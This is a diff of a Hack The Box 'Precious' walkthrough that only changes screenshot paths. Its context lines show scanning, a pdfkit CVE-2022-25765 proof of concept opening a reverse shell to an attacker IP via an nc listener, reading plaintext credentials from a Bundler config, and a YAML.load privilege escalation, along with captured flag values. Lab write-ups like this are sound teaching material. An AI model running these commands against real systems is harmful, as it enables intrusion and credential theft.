@@ -41,7 +41,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.228.98
 ```
 
-![ping](htb-precious_01_ping.png)
+![ping](screenshots/htb-precious_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -52,7 +52,7 @@ Scan all TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.98 -oG allPorts
 ```
 
-![allports](htb-precious_02_nmap_allports.png)
+![allports](screenshots/htb-precious_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -60,7 +60,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](htb-precious_03_extractports.png)
+![extractports](screenshots/htb-precious_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -72,7 +72,7 @@ nmap -sCV -p22,80 10.129.228.98 -oN targeted
 cat targeted
 ```
 
-![targeted](htb-precious_04_nmap_targeted.png)
+![targeted](screenshots/htb-precious_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -99,11 +99,11 @@ whatweb http://precious.htb
 curl http://precious.htb
 ```
 
-![whatweb+cURL](htb-precious_05_hosts_whatweb_curl.png)
+![whatweb+cURL](screenshots/htb-precious_05_hosts_whatweb_curl.png)
 
 Opening the site shows a single form that accepts a URL and attempts to fetch/convert it into a PDF.
 
-![web landing](htb-precious_06_web_landing.png)
+![web landing](screenshots/htb-precious_06_web_landing.png)
 
 Submitting typical public URLs initially failed with a generic error, indicating the backend could not fetch remote targets in that state:
 
@@ -113,7 +113,7 @@ curl -i -s -X POST http://precious.htb/ \
   --data 'url=http://google.com/' | sed -n '1,120p'
 ```
 
-![cannot load remote URL](htb-precious_07_curl_cannot_load.png)
+![cannot load remote URL](screenshots/htb-precious_07_curl_cannot_load.png)
 
 To proceed, a reachable URL was hosted on the attacker box (HTB VPN IP) so the target could fetch it and generate a PDF.
 
@@ -123,7 +123,7 @@ curl -i -s -X POST http://precious.htb/ \
   --data-urlencode "url=http://10.10.15.206:8000/" | sed -n '1,140p'
 ```
 
-![pdf from attacker URL](htb-precious_08_pdf_from_attacker_url.png)
+![pdf from attacker URL](screenshots/htb-precious_08_pdf_from_attacker_url.png)
 
 At this point, the PDF generator could be fingerprinted via metadata to identify the backend library.
 
@@ -134,7 +134,7 @@ exiftool out.pdf | egrep -i 'creator|producer|title|author|subject|create|modify
 pdftotext out.pdf - | head
 ```
 
-![pdfkit fingerprint](htb-precious_09_pdfkit_exiftool_pdftotext.png)
+![pdfkit fingerprint](screenshots/htb-precious_09_pdfkit_exiftool_pdftotext.png)
 
 The `Creator` field confirmed `pdfkit v0.8.6`, which is vulnerable to CVE-2022-25765 (command injection).
 
@@ -152,7 +152,7 @@ mv 51293.py pdfkit_exploit.py
 python3 pdfkit_exploit.py
 ```
 
-![searchsploit PoC](htb-precious_10_searchsploit_pdfkit_poc.png)
+![searchsploit PoC](screenshots/htb-precious_10_searchsploit_pdfkit_poc.png)
 
 Start a listener and trigger a reverse shell via the PoC:
 
@@ -161,7 +161,7 @@ nc -lvnp 4444
 python3 pdfkit_exploit.py -s 10.10.15.206 4444 -w "http://precious.htb/" -p "url"
 ```
 
-![reverse shell as ruby](htb-precious_11_poc_revshell_and_nc.png)
+![reverse shell as ruby](screenshots/htb-precious_11_poc_revshell_and_nc.png)
 
 ---
 ## 4. Privilege Escalation
@@ -180,7 +180,7 @@ ls -la /home/henry/
 cat /home/henry/user.txt
 ```
 
-![ruby enum + denied flag](htb-precious_12_ruby_enum_users_denied_userflag.png)
+![ruby enum + denied flag](screenshots/htb-precious_12_ruby_enum_users_denied_userflag.png)
 
 The `ruby` home directory contained a Bundler config file that stored plaintext credentials:
 
@@ -188,7 +188,7 @@ The `ruby` home directory contained a Bundler config file that stored plaintext 
 cat /home/ruby/.bundle/config
 ```
 
-![bundler creds](htb-precious_13_bundle_config_creds.png)
+![bundler creds](screenshots/htb-precious_13_bundle_config_creds.png)
 
 Using those credentials, SSH access as `henry` was obtained and the user flag retrieved:
 
@@ -197,7 +197,7 @@ ssh henry@10.129.228.98
 cat user.txt
 ```
 
-![user flag](htb-precious_14_ssh_henry_userflag.png)
+![user flag](screenshots/htb-precious_14_ssh_henry_userflag.png)
 
 ðŸ **User flag obtained:** `b06a034a21ae8e8e0a01d40a2cd866c1`
 
@@ -211,7 +211,7 @@ sudo -l
 cat /opt/update_dependencies.rb
 ```
 
-![sudo + script](htb-precious_15_sudo_l_update_dependencies.png)
+![sudo + script](screenshots/htb-precious_15_sudo_l_update_dependencies.png)
 
 The script reads `dependencies.yml` from the current directory and uses `YAML.load`, which is unsafe for untrusted input. A malicious YAML payload was written to `/tmp/dependencies.yml` to execute commands as root.
 
@@ -244,7 +244,7 @@ EOF
 sudo /usr/bin/ruby /opt/update_dependencies.rb
 ```
 
-![yaml id root](htb-precious_16_yaml_id_root.png)
+![yaml id root](screenshots/htb-precious_16_yaml_id_root.png)
 
 Then swap the executed command to print the root flag:
 
@@ -254,7 +254,7 @@ Then swap the executed command to print the root flag:
 sudo /usr/bin/ruby /opt/update_dependencies.rb
 ```
 
-![root flag](htb-precious_17_root_flag.png)
+![root flag](screenshots/htb-precious_17_root_flag.png)
 
 ðŸ **Root flag obtained:** `ffe19116013590e7552249a0976bc9f0`
 
